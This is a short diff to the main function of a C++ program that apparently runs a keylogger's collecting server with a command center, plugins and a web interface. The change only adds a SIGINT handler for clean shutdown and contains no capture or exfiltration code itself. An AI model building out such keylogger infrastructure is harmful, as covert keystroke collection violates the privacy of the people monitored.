@@ -1,8 +1,16 @@
 #include <thread>
+#include <csignal>
 #include "CommandCenter.h"
 #include "SpiderServer.h"
 #include "WebServer.h"
 #include "Logger.hpp"
+
+static volatile bool running = true;
+
+void sigintHandler(int signal)
+{
+  running = false;
+}
 
 int main()
 {
@@ -22,14 +30,16 @@ int main()
     return (EXIT_FAILURE);
   }
 
+  std::signal(SIGINT, &sigintHandler);
+
   // Create and initialize CommandCenter
   spider::server::CommandCenter cmdCenter("./plugins");
 
   // Create keylogger server
-  spider::server::SpiderServer keyloggerServer(cmdCenter);
+  spider::server::SpiderServer keyloggerServer(cmdCenter, running);
 
   // Create controllers here
-  spider::http::WebServer httpServer(cmdCenter);
+  spider::http::WebServer httpServer(cmdCenter, running);
 
   // Add controllers to keylogger server
   keyloggerServer.addController(httpServer);
